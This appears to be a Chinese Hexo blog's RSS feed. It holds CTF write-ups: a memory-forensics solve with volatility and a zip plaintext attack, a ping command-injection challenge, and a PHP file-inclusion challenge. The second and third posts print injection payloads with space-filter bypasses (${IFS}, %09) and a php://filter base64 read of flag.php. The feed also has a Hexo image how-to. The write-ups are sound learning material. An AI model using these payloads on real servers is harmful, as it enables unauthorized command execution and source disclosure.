<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>木木屋</title>
    <link>http://example.com/</link>
    
    <atom:link href="http://example.com/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>再进步一点</description>
    <pubDate>Fri, 01 Sep 2023 09:22:22 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title></title>
      <link>http://example.com/2023/09/01/2023%E8%93%9D%E5%B8%BD%E6%9D%AFmisc%E5%A4%8D%E7%8E%B0/</link>
      <guid>http://example.com/2023/09/01/2023%E8%93%9D%E5%B8%BD%E6%9D%AFmisc%E5%A4%8D%E7%8E%B0/</guid>
      <pubDate>Fri, 01 Sep 2023 09:02:30 GMT</pubDate>
      
        
        
      <description>&lt;h2&gt;&lt;span id=&quot;ez_forensics&quot;&gt;ez_Forensics&lt;/span&gt;&lt;/h2&gt;&lt;p&gt;首先扫描镜像的信息，可以得知使用Win7SP1x64_23418可以获取信息&lt;/p&gt;
&lt;p&gt;扫描进程&lt;/p&gt;
&lt;p&gt;.\volatility.exe -f mem.raw</description>
        
      
      
      
      <content:encoded><![CDATA[<h2><span id="ez_forensics">ez_Forensics</span></h2><p>首先扫描镜像的信息，可以得知使用Win7SP1x64_23418可以获取信息</p><p>扫描进程</p><p>.\volatility.exe -f mem.raw –profile&#x3D;Win7SP1x64_23418 imageinfo</p><p><img src="1.png" alt="image-20230901155558727"></p><p>发现有一个notepad进程，使用editbox插件看看有什么信息</p><p>.\volatility.exe -f mem.raw –profile&#x3D;Win7SP1x64_23418 editbox</p><p><img src="2.png" alt="image-20230901155636606"></p><p>根据信息猜测会有一个压缩文件，并且我们应该需要使用明文攻击来解密压缩包，我们扫描文件看看，将扫描的文件导出搜索</p><p>.\volatility.exe -f mem.raw –profile&#x3D;Win7SP1x64_23418 filescan &gt; file.txt</p><p><img src="3.png" alt="image-20230901155904498"></p><p><img src="4.png" alt="image-20230901155846538"></p><p>有一个压缩包和一个叫readme的文件，导出来</p><p>.\volatility.exe -f mem.raw –profile&#x3D;Win7SP1x64_23418 dumpfiles -Q 0x000000007d41cb50 -D .&#x2F;</p><p>.\volatility.exe -f mem.raw –profile&#x3D;Win7SP1x64_23418 dumpfiles -Q 0x000000007e434590 -D .&#x2F;</p><p><img src="5.png" alt="image-20230901160346071"></p><p>明文攻击，但是要找一下明文，比赛的时候铸币了，那么大一个明文摆在那里看不到</p><p><img src="6.png" alt="image-20230901160415485"></p><p><img src="7.png" alt="image-20230901160436365"></p><p>修改后压缩对比crc32值和压缩方式，使用明文攻击</p><p><img src="8.png" alt="image-20230901160918090"></p><p>得到密钥之后就可以另存然后打开了</p><p><img src="10.png" alt="image-20230901161519795"></p><p>010打开里面的table发现是png</p><p><img src="11.png" alt="image-20230901161715914"></p><p>保存一下</p><p><img src="12.png" alt="image-20230901161736628"></p><p>得到了一个类似密码本一样的东西，回去内存里面继续找东西</p><p><img src="13.png" alt="image-20230901161908632"></p><p>在文件里还发现了key.rsmr，搜了一下rsmr是鼠标的记录</p><p><img src="14.png" alt="image-20230901162002279"></p><p>导出，然后使用软件重复</p><p>发现是在画圈圈，用画图工具记录一下</p><p>、<img src="15.png" alt="image-20230901163229839"></p><p>对照之前的png得到</p><p>a91e37bf</p><p>可能是什么的密码，回去内存里面，进程还有cmd.exe，cmdscan扫描一下</p><p><img src="16.png" alt="image-20230901163624097"></p><p>有个set secret</p><p>换一个consoles</p><p>consoles相似与cmdscan，但是他扫描的不是COMMAND_HISTORY，而是CONSOLE_INFORMATION，而且还有个显著的优点是cmdscan只能查看到输入的指令，而consoles能查看到输入的指令以及缓冲区的输出(即键入和键出)</p><p><img src="17.png" alt="image-20230901163806847"></p><p>得到一串类似AES加密的东西，拿图片解出来的当作密钥</p><p><img src="18.png" alt="image-20230901164136115"></p><p>得到的是第二部分的密码，根据提示，另一部分在密码里第一部分的passware直接出</p><p><img src="19.png" alt="image-20230901165850010"></p><p><img src="20.png" alt="image-20230901165850010"></p><p>最后的flag：flag{194a019a-1767-913a-f140-2626195942a0}</p><h1><span id="后记">后记</span></h1><p>比赛的时候很难受的是，找到了secret的aes，知道后面大概就是找一个key来解密，知道大概就是明文攻击，但是找不到原来明文，现在回来一看亏死了，下次加油</p>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2023/09/01/2023%E8%93%9D%E5%B8%BD%E6%9D%AFmisc%E5%A4%8D%E7%8E%B0/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ping ping ping</title>
      <link>http://example.com/2023/04/03/ping-ping-ping/</link>
      <guid>http://example.com/2023/04/03/ping-ping-ping/</guid>
      <pubDate>Mon, 03 Apr 2023 03:40:02 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;例题：&lt;br&gt;&lt;img src=&quot;ping.png&quot;&gt;&lt;br&gt;打开源码发现也只有&amp;#x2F;?ip&amp;#x3D;&lt;br&gt;随便输入一串ip &amp;#x2F;?127.0.0.1&lt;br&gt;发现有回显，判断为ping命令执行，&amp;#x2F;?127.0.0.1;ls查看目录&lt;br&gt;&lt;img</description>
        
      
      
      
      <content:encoded><![CDATA[<p>例题：<br><img src="ping.png"><br>打开源码发现也只有&#x2F;?ip&#x3D;<br>随便输入一串ip &#x2F;?127.0.0.1<br>发现有回显，判断为ping命令执行，&#x2F;?127.0.0.1;ls查看目录<br><img src="pingls.png"><br>尝试读取flag失败，发现过滤了空格<br><img src="fkspace.png"><br>知识点：绕过过滤<br>绕过空格的方法有：<br>${IFS}$9<br>{IFS}<br>$IFS<br>${IFS}<br>$IFS$1<br>IFS<br>&lt;<br>&lt;&gt;<br>{cat,flag.php}<br>%20   (space)<br>%09   (tab)<br>X&#x3D;$’cat\x09.&#x2F;flag.php’;$X       （\x09表示tab，也可以用\x20）<br>尝试&#x2F;?127.0.0.1;cat${IFS}$9flag.php 发现过滤了{}<br><img src="symbol.png"><br>用$IFS$1 发现不给看flag<br><img src="flag.png"><br>读index发现是php源码，注意到有一个变量a，可以使用简单的拼接<br><img src="index.png"><br>&#x2F;?ip&#x3D;127.0.0.1;a&#x3D;g;cat$IFS$1fla$a.php<br>发现没有回显，最后查看注释发现flag在网页注释里</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/ping/">ping</category>
      
      
      <comments>http://example.com/2023/04/03/ping-ping-ping/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>CTF PHP filter</title>
      <link>http://example.com/2023/04/03/CTF-PHP-filter/</link>
      <guid>http://example.com/2023/04/03/CTF-PHP-filter/</guid>
      <pubDate>Mon, 03 Apr 2023 03:00:39 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;例题1：buuctf include&lt;br&gt;查看源码发现除了一个php之外没有东西，由include想到可能是php漏洞&lt;br&gt;知识点：&lt;br&gt;php:&amp;#x2F;&amp;#x2F;filter 可以伪协议文件包含读取源代码，加上read&amp;#x3D;convert.base64-</description>
        
      
      
      
      <content:encoded><![CDATA[<p>例题1：buuctf include<br>查看源码发现除了一个php之外没有东西，由include想到可能是php漏洞<br>知识点：<br>php:&#x2F;&#x2F;filter 可以伪协议文件包含读取源代码，加上read&#x3D;convert.base64-encode，php中要<br>转为base64输出<br><img src="filter1.png"><br>构造payload：<br>?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php<br><img src="base64res.png"><br>最后解码可得flag</p>]]></content:encoded>
      
      
      
      <category domain="http://example.com/tags/PHP/">PHP</category>
      
      
      <comments>http://example.com/2023/04/03/CTF-PHP-filter/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>hexo中插入图片</title>
      <link>http://example.com/2022/09/04/%E5%9B%BE%E7%89%87/</link>
      <guid>http://example.com/2022/09/04/%E5%9B%BE%E7%89%87/</guid>
      <pubDate>Sat, 03 Sep 2022 18:55:43 GMT</pubDate>
      
      <description>一些在很多次插入图片显示不出来的经历</description>
      
      
      
      <content:encoded><![CDATA[<p>一丶下载插件<br>  在博客根目录下git bash npm install hexo-asset-image –save<br>  修改老版本的文件<br>  node_modules –&gt; hexo-asset-image –&gt; index.js<br>  记事本打开：<br>  $(this).attr(‘src’, config.root + link + src);<br>  把这一行代码改成下面这样<br>  $(this).attr(‘src’, src);<br>  保存文件。<br>二丶更改站点配置<br>  打开站点配置文件并修改<br>  _config.yml中的 post_asset_folder: false<br>  改为true。<br>三丶插入图片<br>  在md编辑工具中使用md语法插入图片<br>  and<br>  在网页上预览<br>  结束~<br>注：<br>  这样设置下来在主页无法显示图片，会有一个显示错误的图标很难看，这里可以用预览来解决<br>  在文章编辑的头部加入<br>  description：XXX<br>  后面写上预览的部分，图片错误就会消失啦<br>  给文章加上预览的功能方法之一就是这样~</p><p><img src="1.jpg"></p>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2022/09/04/%E5%9B%BE%E7%89%87/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>第一次尝试</title>
      <link>http://example.com/2022/08/21/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/</link>
      <guid>http://example.com/2022/08/21/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/</guid>
      <pubDate>Sun, 21 Aug 2022 07:42:59 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;这是第一篇测试文章&lt;/p&gt;
</description>
        
      
      
      
      <content:encoded><![CDATA[<p>这是第一篇测试文章</p>]]></content:encoded>
      
      
      
      
      <comments>http://example.com/2022/08/21/%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%B0%9D%E8%AF%95/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
